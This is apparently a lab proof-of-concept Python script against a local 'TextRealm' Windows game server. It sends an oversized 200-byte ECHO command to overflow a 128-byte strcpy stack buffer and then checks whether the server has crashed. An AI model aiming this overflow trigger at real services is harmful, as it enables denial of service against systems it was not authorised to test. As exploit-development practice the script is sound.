
"""
TextRealm Windows - Simple Buffer Overflow PoC

Demonstrates the ECHO stack-buffer overflow in server_windows(2).c.

The ECHO command copies user-controlled input into a 128-byte
stack buffer using strcpy() without checking its length.

This script tests normal behavior, sends an oversized ECHO
command, and checks whether the server remains available.
"""

import socket
import random
import string
import time

HOST = "127.0.0.1"
PORT = 9999
RECV_CHUNK = 4096

PROMPT = b"> "


def print_banner(title):
    width = 70
    print()
    print("#" * width)
    print(f"# {title}")
    print("#" * width)
    print()


def is_game_running(host, port):
    """Check whether the server is accepting TCP connections."""
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except OSError:
        return False


def random_bytes(n):
    return "".join(
        random.choice(string.ascii_letters)
        for _ in range(n)
    ).encode()


def recv_until_prompt(sock, timeout=3):
    """Receive server output until the game prompt appears."""
    sock.settimeout(timeout)
    data = b""

    while PROMPT not in data:
        chunk = sock.recv(RECV_CHUNK)

        if not chunk:
            raise ConnectionError("Connection closed by server")

        data += chunk

    return data


def print_connection_error(err):
    code = getattr(err, "errno", None)
    desc = getattr(err, "strerror", None) or str(err)

    print(
        f"[!] CONNECTION TERMINATED: "
        f"{code} ({desc})"
    )


def run_test(sock, label, payload):
    """Send a game command and inspect the server response."""
    print_banner(label)

    print(f"Payload length: {len(payload)} bytes")
    print("INPUT STRING:")
    print(payload.decode(errors="replace"))
    print()

    try:
        sock.sendall(payload + b"\r\n")
        response = recv_until_prompt(sock)

        print("SERVER RESPONSE:")
        print(response.decode(errors="replace"))

        return True

    except (OSError, ConnectionError) as err:
        print_connection_error(err)
        return False


def main():
    if not is_game_running(HOST, PORT):
        print(
            f"[-] Nothing is listening on {HOST}:{PORT}. "
            "Is TextRealm running?"
        )
        return

    print(f"[+] Game is running on {HOST}:{PORT}")

    try:
        with socket.create_connection((HOST, PORT), timeout=3) as sock:

            banner = recv_until_prompt(sock)
            print(banner.decode(errors="replace"))

            # Normal ECHO command: fits within the 128-byte buffer.
            valid_payload = b"ECHO " + random_bytes(50)

            if not run_test(
                sock,
                "VALID ECHO INPUT TEST (50 bytes)",
                valid_payload
            ):
                return

            # Oversized ECHO command: exceeds the 128-byte buffer.
            overflow_payload = b"ECHO " + b"A" * 200

            run_test(
                sock,
                "SIMPLE BUFFER OVERFLOW TEST (200 bytes)",
                overflow_payload
            )

    except OSError as err:
        print_connection_error(err)

    time.sleep(1)

    print_banner("SERVER AVAILABILITY CHECK")

    if is_game_running(HOST, PORT):
        print("[+] Server is still accepting connections.")
    else:
        print("[-] Server is not accepting connections.")
        print("[!] Check Immunity Debugger and textrealm.log.")
        print("[!] This alone does not establish the cause.")


if __name__ == "__main__":
    main()
